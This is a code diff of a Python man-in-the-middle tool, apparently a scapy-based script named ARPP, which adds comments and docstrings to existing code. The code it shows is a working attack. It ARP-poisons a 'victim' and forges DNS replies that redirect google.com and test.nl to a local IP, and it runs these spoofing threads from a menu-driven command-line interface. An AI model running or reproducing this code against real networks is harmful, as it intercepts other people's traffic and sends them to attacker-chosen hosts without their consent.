@@ -238,6 +238,7 @@ class ARPP(object):
             print("{}          {}".format(req_and_reply[1].psrc, req_and_reply[1].hwsrc)) #req_and_reply = [request packet, reply packet], we want to read the reply in this case
         print("\n")
         
+        # if there are no replies found, let the user know
         if results.res == []:
             print("[-] No network devices found\n")
         
@@ -321,22 +322,31 @@ class ARPP(object):
         self.ARP_poison(ipVictim=ipRouter, ipToSpoof=ipVictim)
     
     def show_arp_poisoning_threads(self):
+        """A method that allows the user to list all running threaded tasks
+        """
+        # print all running threaded tasks
         alive_tasks_names = {}
         for i,task in enumerate(self.THREADED_TASKS,start=0):
             alive_tasks_names[i] = task.getName()
             if task.is_alive():
                 print("{}: {}".format(i, task.getName()))
+        
+        # if there are no running tasks, let user know
         if not alive_tasks_names:
             print("[!] There are no running threads")
         
     def end_ARP(self):
+        """A method that allows the user to end 1 task from a list of tasks
+        """
         print("From the following threads select the processes to terminate:")
+        # List the names of tasks that may be ended by the user
         alive_tasks_names = {}
         for i,task in enumerate(self.THREADED_TASKS,start=0):
             alive_tasks_names[i] = task.getName()
             if task.is_alive():
                 print("{}: {}".format(i, task.getName()))
-        
+                
+        # get the task the user wants to terminate and try to terminate it
         try:
             ttk_id = int(raw_input("Task to terminate>>"))
             self.EVENTS[ttk_id].set() # stops the thread
@@ -347,6 +357,9 @@ class ARPP(object):
             print(tb)
     
     def DNS_spoof_startup(self):
+        """This method is the entry point to the DNS spoofing option from the menu. 
+        Here the input is obtained from the user.
+        """
         self._assure_interface_is_selected()
         
         # get IP of victim as input
@@ -361,22 +374,23 @@ class ARPP(object):
         self.DNS_spoof(ipVictim=answer)
     
     def DNS_spoof(self, ipVictim=""):
+        """This method implements the actual DNS spoofing.
+
+        Args:
+            ipVictim (str, optional): The IP of the victim that you want to DNS spoof. Defaults to "".
+        """
+        # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
         target_sites = {"google.com.":"192.168.178.217",\
             "test.nl":"192.168.178.217"}
         
+        # this function is called on each packet in the sniff call further ahead
         def packet_callback(packet):
             if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
                 print("DNS in packet: {}".format(DNS in packet)) 
                 print("DNS request for targeted site: {}".format(any([target_site in str(packet[DNSQR].qname) for target_site in target_sites.keys()]) ))
                 print("Packet operation code is 0: {}".format(packet[DNS].opcode==0))
             def send_spoofed_response():
-                # if  (DNS in packet)\
-                #         and (IP in packet)\
-                #         and (packet[IP].src == ipVictim)\
-                #         and (packet[DNS].opcode==0)\
-                #         and (DNSQR in packet)\
-                #         and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
-                #         print("Caught DNS request ")
+                # first we check if the packet is one that needs to be spoofed
                 if  (DNS in packet)\
                         and (IP in packet)\
                         and (packet[IP].src == ipVictim)\
@@ -384,20 +398,25 @@ class ARPP(object):
                         and (DNSQR in packet)\
                         and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
                     # if it's a DNS request and it's coming from the victim and it's a QUERY (i.e. opcode=0) then send fake reply
-                    print("Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
+                    print("[+] Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
                     
+                    # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
                     index_of_target_site = [target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()].index(1)
                     fake_ip = list(target_sites.values())[index_of_target_site]
                     
+                    # create a fake DNS reply packet
                     fake_DNS_reply = IP(dst=packet[IP].src)\
                         /UDP(dport=packet[UDP].sport, sport=53)\
                         /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))\
                         /DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip)
+                    
+                    # send the fake packet on the selected interface
                     send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
-                    print("Sent fake DNS reply to {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
+                    print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
             send_spoofed_response()
                         
-        
+        # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
+        # the threading.Event() is used to stop the thread when the user wants
         e=threading.Event()
         def rec(event):
             while True:
@@ -407,14 +426,19 @@ class ARPP(object):
         
         T = threading.Thread(target=rec, name="DNS spoofing user with IP {}".format(ipVictim), args=(e,))
         
+        # add the thread and event to the class contained list of threads and events
+        # finally, start the DNS spoofing
         self.THREADED_TASKS.append(T)
         self.EVENTS.append(e)
         self.THREADED_TASKS[-1].start()
-        print("Started DNS spoofing user with IP {}".format(ipVictim))
+        print("[+] Started DNS spoofing user with IP {}".format(ipVictim))
         
     def end_all_threads(self):
+        """A method to provide a fast way of ending all threads that are alive, 
+        for memory leak prevention purposes and user convenience
+        """
         if self.THREADED_TASKS != []:
-            print("\n[+] closing threads... please wait")
+            print("[+] closing threads... please wait\n")
             for e in self.EVENTS:
                     e.set()
             del self.EVENTS
@@ -424,11 +448,17 @@ class ARPP(object):
         
 
     def parse_command(self, command):
-        if command == "":
+        """All commmands supplied by the user in the interface are parsed here and start the task corresponding to the command
+
+        Args:
+            command (str): The command to be executed
+        """
+        if command == "": # if there is no command, don't give the '[-] command not found' feedback
             pass
-        elif self._represents_int(command):
+        elif self._represents_int(command): # if the user supplies an integer command corresponding to a menu option
             command = int(command)
             try:
+                # get the task name and execute the task; if it's the exit command, make sure to end all running threads
                 task_name = list(set(self.TASK_DICT.keys()))[command]
                 task = self.TASK_DICT[task_name]
                 if task == sys.exit:
@@ -436,9 +466,10 @@ class ARPP(object):
                 task()
             except IndexError as e:
                 print("[-] Command not found\n")
+            except:
                 tb = traceback.format_exc()
                 print(tb)
-        else:
+        else: # if the user supplies a string command corresponding to a menu option
             try:
                 task = self.TASK_DICT[command]
                 if task == sys.exit:
@@ -449,14 +480,17 @@ class ARPP(object):
                 
 
     def CLI(self):
+        """This method takes in user input and passes it to the parse_command method
+        """
         try:
             command = raw_input(">>") #rawrawrawsputin
-            command = str(command).lower()
+            command = str(command).strip() # remove trailing spaces
             self.parse_command(command=command)
         except SyntaxError:
             pass
 
 def main():
+    # create the class and start the command line interface
     cl = ARPP()
     print_banner()
     cl.print_menu()
